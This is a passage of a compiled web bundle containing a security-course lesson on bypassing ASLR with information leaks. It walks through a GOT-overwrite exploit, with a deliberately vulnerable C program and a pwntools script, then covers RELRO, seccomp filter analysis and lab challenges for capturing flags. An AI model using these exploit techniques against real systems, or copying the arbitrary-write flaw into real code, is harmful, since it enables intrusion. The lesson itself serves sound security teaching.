read\n$1 = {<text variable, no debug info>} 0xe6dd0 <__GI___libc_read>\npwndbg> p write\n$2 = {<text variable, no debug info>} 0xe6ea0 <__GI___libc_write>\n")),(0,i.yg)("p",{parentName:"li"},"However, since bits 12-16 of the offsets differ, the corresponding bits in the full addresses would have to be brute-forced (probability 1/4).")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("strong",{parentName:"p"},"Information leak"),":\nThe most effective way of bypassing ASLR is by using an information leak vulnerability that exposes randomized address, or at least parts of them.\nYou can also dump parts of libraries (e.g. ",(0,i.yg)("inlineCode",{parentName:"p"},"libc"),") if you are able to create an exploit that reads them.\nThis is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right offsets for other functions (not originally linked with the binary)."))),(0,i.yg)("h3",{id:"chaining-information-leaks-with-got-overwrite"},"Chaining Information Leaks with GOT Overwrite"),(0,i.yg)("p",null,"In this tutorial we will exploit a program that is similar to the ",(0,i.yg)("inlineCode",{parentName:"p"},"no-ret-control")," challenge from a previous session:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},'#include <stdio.h>\n#include <unistd.h>\n\nint main() {\n    int *addr;\n\n    printf("Here\'s a libc address: 0x%08x\\n", printf);\n\n    printf("Give me and address to modify!\\n");\n    scanf("%p", &addr);\n\n    printf("Give me a value!\\n");\n    scanf("%u", addr);\n\n    sleep(10);\n\n    printf("Abandon all hope ye who reach this...\\n");  \n}\n')),(0,i.yg)("p",null,"The goal is to alter the execution flow and avoid reaching the final ",(0,i.yg)("inlineCode",{parentName:"p"},"printf"),".\nTo this end, we will overwrite the ",(0,i.yg)("inlineCode",{parentName:"p"},"sleep")," entry in GOT and redirect it to ",(0,i.yg)("inlineCode",{parentName:"p"},"exit"),".\nHowever, due to ASLR, the value can not be hardcoded and must be computed at runtime."),(0,i.yg)("p",null,"Whenever we operate with addresses belonging to shared libraries, we must be aware that the offsets are highly dependent on the particular build of the library.\nWe can identify this build either by its ",(0,i.yg)("inlineCode",{parentName:"p"},"BuildID")," (retrieved with the file command), or by its version string:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'silvia@imladris:/sss/demo$ ldd ./got_overwrite\n    linux-gate.so.1 (0xf7ee8000)\n    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7ccc000)\n    /lib/ld-linux.so.2 (0xf7ee9000)\nsilvia@imladris:/sss/demo$ file $(realpath /lib/i386-linux-gnu/libc.so.6)\n/lib/i386-linux-gnu/libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cf1599aa8b3cb35f79dcaea7a8b48704ecf42a19, for GNU/Linux 3.2.0, stripped\nsilvia@imladris:/sss/demo$ strings /lib/i386-linux-gnu/libc.so.6 | grep "GLIBC "\nGNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.\n')),(0,i.yg)("p",null,"Alternatively, if we don't have prior knowledge of the remote system where the binary runs, but obtain via an information leak some addresses, we may be able to identify the libc based on the last 3 nibbles (a nibble is a group of 4 bits) of these addresses:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"0xf7df6250 <__libc_system>\n0xf7e780e0 <__sleep>\n")),(0,i.yg)("p",null,"The least significant 3 nibbles of the above addresses are ",(0,i.yg)("inlineCode",{parentName:"p"},"250")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"0e0"),", respectively."),(0,i.yg)("p",null,"We enter them in the ",(0,i.yg)("a",{parentName:"p",href:"https://libc.blukat.me/"},"libc database")," and get a match for the same ",(0,i.yg)("inlineCode",{parentName:"p"},"libc")," build we determined earlier."),(0,i.yg)("p",null,"For this ",(0,i.yg)("inlineCode",{parentName:"p"},"libc"),", we obtain the offsets of the functions we are interested in using GDB:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"silvia@imladris:/sss/demo$ gdb -q -n /lib/i386-linux-gnu/libc.so.6\n(gdb) p printf\n$1 = {<text variable, no debug info>} 0x513a0 <__printf>\n(gdb) p exit\n$2 = {<text variable, no debug info>} 0x30420 <__GI_exit>\n")),(0,i.yg)("p",null,"We will also need the address of ",(0,i.yg)("inlineCode",{parentName:"p"},"sleep@got")," (which is static because the binary is not position independent):"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'silvia@imladris:/sss/demo$ objdump -d -M intel -j .plt ./got_overwrite | grep "sleep@plt" -A1\n080483b0 <sleep@plt>:\n 80483b0:   ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c\n')),(0,i.yg)("p",null,"We start the program and compute the address of exit based on the leak of ",(0,i.yg)("inlineCode",{parentName:"p"},"printf")," (in another terminal):"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},">>> printf_offset = 0x513a0\n>>> exit_offset = 0x30420\n>>> 0xf7dfb3a0 - printf_offset + exit_offset\n4158497824\n")),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"silvia@imladris:/sss/demo$ ./got_overwrite\nHere's a libc address: 0xf7dfb3a0\nGive me and address to modify!\n0x804a00c\nGive me a value!\n4158497824\nsilvia@imladris:/sss/demo$ echo $?\n10\n")),(0,i.yg)("p",null,"As we intended, the ",(0,i.yg)("inlineCode",{parentName:"p"},"GOT")," entry corresponding to ",(0,i.yg)("inlineCode",{parentName:"p"},"sleep")," was overwritten by exit and the program exited with code 10 without printing the final message.\nThe following pwntools script automates this interaction:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\np = process('./got_overwrite')\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\n\nsleep_got = p.elf.got['sleep']\n\np.recvuntil('libc address:')\nlibc_leak = int(p.recvuntil('\\n')[:-1], 16)\nlibc_base = libc_leak - libc.symbols['printf']\n\nprint(\"Libc base is at: 0x%x\" % libc_base)\n\nexit = libc_base + libc.symbols['exit']\n\np.sendline(hex(sleep_got))\n\np.recvuntil('value!')\np.sendline(str(exit))\n\np.interactive()\n")),(0,i.yg)("h3",{id:"relro"},(0,i.yg)("inlineCode",{parentName:"h3"},"RELRO")),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"RELRO")," (Relocation Read-Only) defends against attacks which overwrite data in relocation sections, such as the ",(0,i.yg)("strong",{parentName:"p"},(0,i.yg)("inlineCode",{parentName:"strong"},"GOT")," overwrite")," we showed earlier."),(0,i.yg)("p",null,"It comes in two flavors:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"Partial"),":\nProtects the ",(0,i.yg)("inlineCode",{parentName:"li"},".init_array"),", ",(0,i.yg)("inlineCode",{parentName:"li"},".fini_array"),", ",(0,i.yg)("inlineCode",{parentName:"li"},".dynamic")," and ",(0,i.yg)("inlineCode",{parentName:"li"},".got")," sections (but NOT ",(0,i.yg)("inlineCode",{parentName:"li"},".got.plt"),")."),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"Full"),":\nAdditionally protects ",(0,i.yg)("inlineCode",{parentName:"li"},".got.plt"),", rendering the ",(0,i.yg)("inlineCode",{parentName:"li"},"GOT")," overwrite attack infeasible.")),(0,i.yg)("p",null,"In a previous session we explained how the addresses of dynamically linked functions are resolved using lazy binding.\nWhen ",(0,i.yg)("inlineCode",{parentName:"p"},"Full RELRO")," is in effect, the addresses are resolved at load-time and then marked as read-only.\nDue to the way address space protection works, this means that the ",(0,i.yg)("inlineCode",{parentName:"p"},".got")," resides in the read-only mapping, instead of the read-write mapping that contains the ",(0,i.yg)("inlineCode",{parentName:"p"},".bss"),"."),(0,i.yg)("p",null,"This is not a game-over in terms of exploitation, as other writable code pointers often exist.\nThese can be specific to the application we want to exploit or reside in shared libraries (for example: the GOT of shared libraries that are not compiled with ",(0,i.yg)("inlineCode",{parentName:"p"},"RELRO"),").\nThe return addresses on the stack are still viable targets."),(0,i.yg)("h3",{id:"seccomp"},(0,i.yg)("inlineCode",{parentName:"h3"},"seccomp")),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"seccomp")," is a mechanism though which an application may transition into a state where the system calls it performs are restricted.\nThe policy, which may act on a whitelist or blacklist model, is described using ",(0,i.yg)("a",{parentName:"p",href:"https://lwn.net/Articles/593476/"},(0,i.yg)("inlineCode",{parentName:"a"},"eBPF")),"."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"secccomp")," filters are instated using the ",(0,i.yg)("inlineCode",{parentName:"p"},"prctl")," syscall (",(0,i.yg)("inlineCode",{parentName:"p"},"PR_SET_SECCOMP"),").\nOnce it is in effect, the application will be effectively sandboxed and the restrictions will be inherited by child processes."),(0,i.yg)("p",null,"This may severely limit our exploitation prospects in some cases.\nIn the challenges that we have solved during these sessions, a common goal was spawning a shell and retrieving a certain file (the flag).\nIf the exploited binary used a ",(0,i.yg)("inlineCode",{parentName:"p"},"seccomp")," filter that disallowed the ",(0,i.yg)("inlineCode",{parentName:"p"},"execve")," syscall (used by the ",(0,i.yg)("inlineCode",{parentName:"p"},"system")," library function), this would have thwarted our exploit."),(0,i.yg)("p",null,"The ",(0,i.yg)("a",{parentName:"p",href:"https://github.com/david942j/seccomp-tools"},(0,i.yg)("inlineCode",{parentName:"a"},"seccomp-tools"))," suite provides tools for analyzing ",(0,i.yg)("inlineCode",{parentName:"p"},"seccomp")," filters.\nThe ",(0,i.yg)("inlineCode",{parentName:"p"},"dump")," subcommand may be used to extract the filter from a binary at runtime and display it in a pseudocode format:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ seccomp-tools dump ./seccomp_example\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011\n 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011\n 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011\n 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011\n 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011\n 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011\n 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011\n 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n")),(0,i.yg)("p",null,"In the example above we see a filter operating on the whitelist model: it specifies a subset of syscalls that are allowed: ",(0,i.yg)("inlineCode",{parentName:"p"},"rt_sigreturn"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"sigreturn"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"exit_group"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"exit"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"open"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"read")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"write"),"."),(0,i.yg)("p",null,"To install ",(0,i.yg)("inlineCode",{parentName:"p"},"seccomp-tools")," on the Kali VM, use the the ",(0,i.yg)("inlineCode",{parentName:"p"},"gem")," package manager:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"gem install seccomp-tools\n")),(0,i.yg)("h2",{id:"challenges"},"Challenges"),(0,i.yg)("p",null,"Challenges can be found in the ",(0,i.yg)("inlineCode",{parentName:"p"},"drills/")," directory."),(0,i.yg)("h3",{id:"01-04-challenges---rwslotmachine-1-4"},"01-04. Challenges - ",(0,i.yg)("inlineCode",{parentName:"h3"},"rwslotmachine")," ","[1-4]"),(0,i.yg)("p",null,"All of the challenges in this section are intended to be solved with ",(0,i.yg)("strong",{parentName:"p"},(0,i.yg)("inlineCode",{parentName:"strong"},"ASLR")," enabled"),".\nHowever, you are free to disable it while developing your exploit for debugging purposes.\nYou are provided with the needed shared libraries from the remote system."),(0,i.yg)("p",null,'The challenges are based on the same "application": the binaries expose very similar functionality with minimal implementation differences.\nYour job is to identify the defense mechanisms in use for each of them and bypass them in order to read a flag from the remote system.'),(0,i.yg)("p",null,"They are numbered in the suggested solving order."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Tips"),":"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"Do not waste time on reverse engineering ",(0,i.yg)("inlineCode",{parentName:"li"},"rwslotmachine3"),"!\nIt is very similar to ",(0,i.yg)("inlineCode",{parentName:"li"},"rwslotmachine2"),", but operates on the client/server model."),(0,i.yg)("li",{parentName:"ul"},"To set ",(0,i.yg)("inlineCode",{parentName:"li"},"LD_LIBRARY_PATH")," from within a pwntools script, use ",(0,i.yg)("inlineCode",{parentName:"li"},"p = process('./rwslotmachineX', env={'LD_LIBRARY_PATH' : '.'})"),"."),(0,i.yg)("li",{parentName:"ul"},"In the case of ",(0,i.yg)("inlineCode",{parentName:"li"},"rwslotmachine4"),", you will need the shared library ",(0,i.yg)("inlineCode",{parentName:"li"},"libint.so")," (found inside of the GitHub repository).")),(0,i.yg)("h3",{id:"05-bonus---rwslotmachine5"},"05. Bonus - ",(0,i.yg)("inlineCode",{parentName:"h3"},"rwslotmachine5")),(0,i.yg)("p",null,"This challenge is similar to ",(0,i.yg)("inlineCode",{parentName:"p"},"rwslotmachine1"),".\nHowever, your exploit for the first challenge will (most likely) not work.\nInvestigate why and develop a bypass."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Hint"),": You can find a table describing x86 syscalls ",(0,i.yg)("a",{parentName:"p",href:"https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit"},"here"),"."),(0,i.yg)("h2",{id:"further-reading"},"Further Reading"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"https://en.wikipedia.org/wiki/PaX#PAGEEXEC"},(0,i.yg)("inlineCode",{parentName:"a"},"PaX PAGEEXEC"))),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"https://en.wikipedia.org/wiki/PaX#SEGMEXEC"},(0,i.yg)("inlineCode",{parentName:"a"},"PaX SEGMEXEC"))),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf"},"Black Hat & DEF CON 2010, JIT spraying slides"),";"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf"},"Interpreter Exploitation. Pointer Inference and JIT Spraying"),"."),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention"},(0,i.yg)("inlineCode",{parentName:"a"},"DEP"))),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"https://lwn.net/Articles/593476/"},(0,i.yg)("inlineCode",{parentName:"a"},"eBPF")))))}g.isMDXComponent=!0}}]);